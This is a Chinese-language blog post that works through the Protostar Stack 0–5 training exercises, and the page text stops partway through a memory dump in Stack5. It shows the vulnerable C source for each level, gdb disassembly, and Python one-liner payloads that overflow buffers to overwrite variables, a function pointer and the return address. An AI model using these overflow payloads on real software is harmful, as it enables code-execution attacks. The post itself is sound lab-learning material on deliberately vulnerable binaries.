<!DOCTYPE html>




<html class="theme-next muse" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="Exploit Exercises Protostar,Stack,">





  <link rel="alternate" href="/atom.xml" title="giantbranch's blog" type="application/atom+xml">






<meta name="description" content="Stack0首先看下源码 123456789101112131415161718#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;int main(int argc, char **argv)&amp;#123;  volatile int modified;  char buffer[64];  modif">
<meta name="keywords" content="Exploit Exercises Protostar,Stack">
<meta property="og:type" content="article">
<meta property="og:title" content="Exploit Exercises Protostar Stack Part 0-7">
<meta property="og:url" content="https://www.giantbranch.cn/2017/08/03/Exploit Exercises Protostar Stack Part 0-7/index.html">
<meta property="og:site_name" content="giantbranch&#39;s blog">
<meta property="og:description" content="Stack0首先看下源码 123456789101112131415161718#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;int main(int argc, char **argv)&amp;#123;  volatile int modified;  char buffer[64];  modif">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2023-10-13T13:14:33.054Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Exploit Exercises Protostar Stack Part 0-7">
<meta name="twitter:description" content="Stack0首先看下源码 123456789101112131415161718#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;int main(int argc, char **argv)&amp;#123;  volatile int modified;  char buffer[64];  modif">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.3',
    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://www.giantbranch.cn/2017/08/03/Exploit Exercises Protostar Stack Part 0-7/">





  <title>Exploit Exercises Protostar Stack Part 0-7 | giantbranch's blog</title>
  




<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-121265336-1', 'auto');
  ga('send', 'pageview');
</script>


  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?e3a097ddc6964e154e65d478725ac9ed";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">giantbranch's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">忘掉掌声，按自己的方式，继续前行，跑过一生</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-book">
          <a href="/book/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
            
            读过的书
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            站点地图
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://www.giantbranch.cn/2017/08/03/Exploit Exercises Protostar Stack Part 0-7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="giantbranch">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="giantbranch's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">Exploit Exercises Protostar Stack Part 0-7</h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-03T00:00:00+00:00">
                2017-08-03
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/08/03/Exploit Exercises Protostar Stack Part 0-7/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/08/03/Exploit Exercises Protostar Stack Part 0-7/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="Stack0"><a href="#Stack0" class="headerlink" title="Stack0"></a>Stack0</h1><p>首先看下源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">  volatile int modified;</span><br><span class="line">  char buffer[64];</span><br><span class="line"></span><br><span class="line">  modified = 0;</span><br><span class="line">  gets(buffer);</span><br><span class="line"></span><br><span class="line">  if(modified != 0) &#123;</span><br><span class="line">      printf(&quot;you have changed the &apos;modified&apos; variable\n&quot;);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">      printf(&quot;Try again?\n&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看来我们是要通过缓冲区溢出讲局部变量modified的值改为1或者我们将程序的返回值直接执行成功的printf就行了</p>
<p>首先看看汇编代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">0x080483f4 &lt;main+0&gt;:	push   %ebp</span><br><span class="line">0x080483f5 &lt;main+1&gt;:	mov    %esp,%ebp</span><br><span class="line">0x080483f7 &lt;main+3&gt;:	and    $0xfffffff0,%esp</span><br><span class="line">0x080483fa &lt;main+6&gt;:	sub    $0x60,%esp</span><br><span class="line">0x080483fd &lt;main+9&gt;:	movl   $0x0,0x5c(%esp)		</span><br><span class="line">0x08048405 &lt;main+17&gt;:	lea    0x1c(%esp),%eax</span><br><span class="line">0x08048409 &lt;main+21&gt;:	mov    %eax,(%esp)</span><br><span class="line">0x0804840c &lt;main+24&gt;:	call   0x804830c &lt;gets@plt&gt;</span><br><span class="line">0x08048411 &lt;main+29&gt;:	mov    0x5c(%esp),%eax</span><br><span class="line">0x08048415 &lt;main+33&gt;:	test   %eax,%eax</span><br><span class="line">0x08048417 &lt;main+35&gt;:	je     0x8048427 &lt;main+51&gt;</span><br><span class="line">0x08048419 &lt;main+37&gt;:	movl   $0x8048500,(%esp)</span><br><span class="line">0x08048420 &lt;main+44&gt;:	call   0x804832c &lt;puts@plt&gt;</span><br><span class="line">0x08048425 &lt;main+49&gt;:	jmp    0x8048433 &lt;main+63&gt;</span><br><span class="line">0x08048427 &lt;main+51&gt;:	movl   $0x8048529,(%esp)</span><br><span class="line">0x0804842e &lt;main+58&gt;:	call   0x804832c &lt;puts@plt&gt;</span><br><span class="line">0x08048433 &lt;main+63&gt;:	leave  </span><br><span class="line">0x08048434 &lt;main+64&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>看到这个<code>0x080483fd &lt;main+9&gt;:    movl   $0x0,0x5c(%esp)</code>    ，就是    modified = 0;</p>
<p>下面这个就是buffer的地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x08048405 &lt;main+17&gt;:   lea    0x1c(%esp),%eax</span><br><span class="line">0x08048409 &lt;main+21&gt;:   mov    %eax,(%esp)</span><br></pre></td></tr></table></figure>

<p>为了看看开了什么保护，还是装个peda，懒得去单独搞个checksec了，结果发现用不了这个虚拟机的gdb不支持python的感觉，还是搞checksec吧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./checksec -f /opt/protostar/bin/stack0</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE</span><br><span class="line">No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No	0		2	/opt/protostar/bin/stack0</span><br></pre></td></tr></table></figure>

<p>0x5c跟0x1c相差了0x40个字节，我们实时0x44个A是什么情况<br>可以看到刚好覆盖到了，假如我们覆盖成1或者其他非0值就行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x /4w $esp+0x5c</span><br><span class="line">0xbffffcac:	0x41414141	0x08048400	0x00000000	0xbffffd38</span><br></pre></td></tr></table></figure>

<h2 id="覆盖成1或者其他非0值"><a href="#覆盖成1或者其他非0值" class="headerlink" title="覆盖成1或者其他非0值"></a>覆盖成1或者其他非0值</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python -c &apos;print &quot;A&quot;*0x40+&quot;\x01\x00\x00\x00&quot;&apos; | ./stack0</span><br><span class="line">you have changed the &apos;modified&apos; variable</span><br><span class="line">$ python -c &apos;print &quot;A&quot;*0x40+&quot;\x01&quot;&apos; | ./stack0</span><br><span class="line">you have changed the &apos;modified&apos; variable</span><br></pre></td></tr></table></figure>

<p>##覆盖返回地址</p>
<p>发现buffer距离返回地址是0x54,后面改为要覆盖的地址即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python -c &apos;print &quot;A&quot;*0x50+&quot;\x19\x84\x04\x08&quot;&apos; | ./stack0</span><br><span class="line">you have changed the &apos;modified&apos; variable</span><br><span class="line">you have changed the &apos;modified&apos; variable</span><br><span class="line">Segmentation fault                                                                                                                            </span><br><span class="line">$ python -c &apos;print &quot;\x00&quot;*0x50+&quot;\x19\x84\x04\x08&quot;&apos; | ./stack0</span><br><span class="line">Try again?</span><br><span class="line">you have changed the &apos;modified&apos; variable</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>

<p>有个问题就是段错误了</p>
<h1 id="stack1"><a href="#stack1" class="headerlink" title="stack1"></a>stack1</h1><p>还是先看代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">  volatile int modified;</span><br><span class="line">  char buffer[64];</span><br><span class="line"></span><br><span class="line">  if(argc == 1) &#123;</span><br><span class="line">      errx(1, &quot;please specify an argument\n&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modified = 0;</span><br><span class="line">  strcpy(buffer, argv[1]);</span><br><span class="line"></span><br><span class="line">  if(modified == 0x61626364) &#123;</span><br><span class="line">      printf(&quot;you have correctly got the variable to the right value\n&quot;);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">      printf(&quot;Try again, you got 0x%08x\n&quot;, modified);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个基本跟stack0差不多，不过这里要求modified 必须为0x61626364<br>还有就是这里通过命令行传参</p>
<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./stack1 $(python -c &apos;print &quot;A&quot;*0x40+&quot;dcba&quot;&apos;) </span><br><span class="line">you have correctly got the variable to the right value</span><br></pre></td></tr></table></figure>

<h1 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">  volatile int modified;</span><br><span class="line">  char buffer[64];</span><br><span class="line">  char *variable;</span><br><span class="line"></span><br><span class="line">  variable = getenv(&quot;GREENIE&quot;);</span><br><span class="line"></span><br><span class="line">  if(variable == NULL) &#123;</span><br><span class="line">      errx(1, &quot;please set the GREENIE environment variable\n&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modified = 0;</span><br><span class="line"></span><br><span class="line">  strcpy(buffer, variable);</span><br><span class="line"></span><br><span class="line">  if(modified == 0x0d0a0d0a) &#123;</span><br><span class="line">      printf(&quot;you have correctly modified the variable\n&quot;);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">      printf(&quot;Try again, you got 0x%08x\n&quot;, modified);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里考察的是设置环境变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ GREENIE=`python -c &apos;print &quot;A&quot;*0x40+&quot;\x0a\x0d\x0a\x0d&quot;&apos;`</span><br><span class="line">$ export GREENIE</span><br><span class="line">$ ./stack2</span><br><span class="line">you have correctly modified the variable</span><br></pre></td></tr></table></figure>

<h1 id="stack-3"><a href="#stack-3" class="headerlink" title="stack 3"></a>stack 3</h1><p>代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">void win()</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;code flow successfully changed\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">  volatile int (*fp)();</span><br><span class="line">  char buffer[64];</span><br><span class="line"></span><br><span class="line">  fp = 0;</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line"></span><br><span class="line">  if(fp) &#123;</span><br><span class="line">      printf(&quot;calling function pointer, jumping to 0x%08x\n&quot;, fp);</span><br><span class="line">      fp();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获得win函数地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print win</span><br><span class="line">$1 = &#123;void (void)&#125; 0x8048424 &lt;win&gt;</span><br></pre></td></tr></table></figure>

<p>所以最终就简单了，但是我们这里好像直接覆盖返回地址的话比如覆盖一个fp能执行且不影响程序的地址，原因应该是调用了fp();<br>为了简单<br>所以我们覆盖fp的值就好了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python -c &apos;print &quot;A&quot;*0x40+&quot;\x24\x84\x04\x08&quot;&apos; | ./stack3 </span><br><span class="line">calling function pointer, jumping to 0x08048424</span><br><span class="line">code flow successfully changed</span><br></pre></td></tr></table></figure>

<h1 id="stack4"><a href="#stack4" class="headerlink" title="stack4"></a>stack4</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">void win()</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;code flow successfully changed\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">  char buffer[64];</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个就直接覆盖返回地址了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print win</span><br><span class="line">$1 = &#123;void (void)&#125; 0x80483f4 &lt;win&gt;</span><br></pre></td></tr></table></figure>

<p>调试发现偏移是0x4c</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python -c &apos;print &quot;A&quot;*0x4C+&quot;\xf4\x83\x04\x08&quot;&apos; | ./stack4</span><br><span class="line">code flow successfully changed</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>

<h1 id="stack5"><a href="#stack5" class="headerlink" title="stack5"></a>stack5</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">  char buffer[64];</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里叫你开始执行shellcode了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">0x080483c4 &lt;main+0&gt;:	push   %ebp</span><br><span class="line">0x080483c5 &lt;main+1&gt;:	mov    %esp,%ebp</span><br><span class="line">0x080483c7 &lt;main+3&gt;:	and    $0xfffffff0,%esp</span><br><span class="line">0x080483ca &lt;main+6&gt;:	sub    $0x50,%esp</span><br><span class="line">0x080483cd &lt;main+9&gt;:	lea    0x10(%esp),%eax</span><br><span class="line">0x080483d1 &lt;main+13&gt;:	mov    %eax,(%esp)</span><br><span class="line">0x080483d4 &lt;main+16&gt;:	call   0x80482e8 &lt;gets@plt&gt;</span><br><span class="line">0x080483d9 &lt;main+21&gt;:	leave  </span><br><span class="line">0x080483da &lt;main+22&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) b *0x080483d4</span><br><span class="line">Breakpoint 1 at 0x80483d4: file stack5/stack5.c, line 10.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /opt/protostar/bin/stack5 </span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080483d4 in main (argc=1, argv=0xbffffd64) at stack5/stack5.c:10</span><br><span class="line">10	stack5/stack5.c: No such file or directory.</span><br><span class="line">	in stack5/stack5.c</span><br><span class="line">(gdb) x $eax</span><br><span class="line">0xbffffc70:	0xb7fd7ff4</span><br></pre></td></tr></table></figure>

<p>eax的值就是局部变量的其实地址，我们将返回地址覆盖为这个，shellcode放最前面就行了</p>
<p>有个坑就是这个地址跟实际的不一样，我们调试的gdb地址是调试状态的地址。所以要用core文件。</p>
<p>用这个定位<code>ABCDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">root@protostar:/tmp# gdb /opt/protostar/bin/stack5  core.11.stack5.3147 </span><br><span class="line">GNU gdb (GDB) 7.0.1-debian</span><br><span class="line">Copyright (C) 2009 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;i486-linux-gnu&quot;.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;...</span><br><span class="line">/root/.gdbinit:1: Error in sourced command file:</span><br><span class="line">/root/peda/peda.py:8: Error in sourced command file:</span><br><span class="line">Undefined command: &quot;from&quot;.  Try &quot;help&quot;.</span><br><span class="line">Reading symbols from /opt/protostar/bin/stack5...done.</span><br><span class="line"></span><br><span class="line">warning: Can&apos;t read pathname for load map: Input/output error.</span><br><span class="line">Reading symbols from /lib/libc.so.6...Reading symbols from /usr/lib/debug/lib/libc-2.11.2.so...done.</span><br><span class="line">(no debugging symbols found)...done.</span><br><span class="line">Loaded symbols for /lib/libc.so.6</span><br><span class="line">Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug/lib/ld-2.11.2.so...done.</span><br><span class="line">(no debugging symbols found)...done.</span><br><span class="line">Loaded symbols for /lib/ld-linux.so.2</span><br><span class="line">Core was generated by `./stack5&apos;.</span><br><span class="line">Program terminated with signal 11, Segmentation fault.</span><br><span class="line">#0  0x41414141 in ?? ()</span><br><span class="line">(gdb) x /30x $esp-0x50</span><br><span class="line">0xbffffc50:	0x44434241	0x41414141	0x41414141	0x41414141</span><br><span class="line">0xbffffc60:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0xbffffc70:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0xbffffc80:	0x41414141	0x41414141	0x41414141	